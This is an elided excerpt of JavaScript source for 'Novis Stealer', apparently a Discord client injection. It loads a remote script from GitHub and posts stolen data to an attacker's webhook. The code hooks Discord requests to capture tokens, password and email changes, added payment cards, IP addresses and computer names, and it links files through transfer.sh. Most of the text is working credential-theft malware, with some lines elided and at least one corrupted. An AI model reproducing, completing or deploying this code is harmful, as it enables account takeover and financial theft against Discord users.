...
var config = {
    ...
    injection_url: "https://raw.githubusercontent.com/r3nko/injection/main/inj.js",
    webhook: "%WEBHOOK%",
    Placed: "%API_URL%",
    Filter: {
        "urls": [
...
const makeEmbed = async({
    ...
    var params = {
        ...
        embeds: [{
            ...
            footer: {
                text: `�[${config.creator}] | https://github.com/r3nko/`
            },
    ...
    if (fs.existsSync(__dirname + "/Creal")) {
        ...
        if (!token) {
            var params = await makeEmbed({
                title: "Novis Stealer Initialized",
                fields: [{
                    name: "Injection Info",
            ...
            if (!user.avatar) var userAvatar = "https://i.imgur.com/EHD6KHJ.png"
            if (!user.banner) var userBanner = "https://i.imgur.com/NdlrsXD.gif"
            ...
            var params = await makeEmbed({
                ...
                fields: [{
                    ...
                    name: "@Copyright",
                    value: `[Novis Stealer](https://github.com/r3nko/Novis)`,
                    inline: !0
                }, {
                    name: "Novis Files",
        ...
        if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
            if (!token) {
                var params = await makeEmbed({
                    title: "Novis User log out (User not Logged in before)",
                    fields: [{
                        name: "Injection Info",
                ...
                userAvatar = userAvatar ? ? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
                var params = await makeEmbed({
                    title: "Novis User got logged out",
    ...
    switch (true) {
        ...
        case request.url.endsWith("users/@me"):
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "Novis User Password Changed",
                    color: config['embed-color'],
                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                    fields: [{
                        name: "Username <:username:1041634536733290596> ",
            ...
            if (data.email) {
                var params = await makeEmbed({
                    title: "Novis User Email Changed",
                    color: config['embed-color'],
                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                    fields: [{
                        name: "Username <:username:1041634536733290596> ",
        ...
        case request.url.endsWith("tokens"):
            ...
            var params = await makeEmbed({
                title: "Novis User Added Card",
                color: config['embed-color'],
                fields: [
                    { name: "Novis Files", value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})` },
                    { name: "IP", value: ip },
